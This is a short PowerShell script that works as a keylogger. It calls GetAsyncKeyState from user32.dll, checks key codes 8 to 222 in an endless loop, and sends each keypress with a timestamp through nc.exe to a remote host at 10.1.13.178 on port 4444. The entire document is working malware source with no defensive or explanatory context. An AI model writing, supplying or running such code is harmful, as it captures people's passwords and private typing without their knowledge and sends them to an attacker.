Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@ 

# Define the remote server IP and port
$remoteIP = "10.1.13.178"  # Remote server IP
$remotePort = 4444         # Port where Netcat is listening

# List of key codes to monitor (common keys from 8 to 222)
$keys = 8..222

while ($true) {
    foreach ($key in $keys) {
        if ([Keyboard]::GetAsyncKeyState($key) -ne 0) {
            $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            $message = "$timestamp - Key: $key"
            echo $message | Out-String | nc.exe $remoteIP $remotePort
            Start-Sleep -Milliseconds 100  # Short delay to avoid duplicates
        }
    }
}
